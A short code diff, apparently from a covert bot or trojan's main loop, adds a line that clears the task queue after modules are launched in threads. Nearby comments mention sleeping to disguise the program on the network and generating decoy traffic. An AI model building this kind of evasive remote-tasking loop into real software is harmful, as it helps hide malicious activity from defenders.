@@ -125,6 +125,7 @@ while True:
             t = threading.Thread(target=module_runner,args=(task['module'],task['time'],))
             t.start()
             time.sleep(random.randint(1,10)) #not important... make it low
+        with task_queue.mutex: task_queue.queue.clear()
             
     #time.sleep(random.randint(1000,1000000))#dusguise in network, attempt to sleep
     #or generate random trafic to common pages
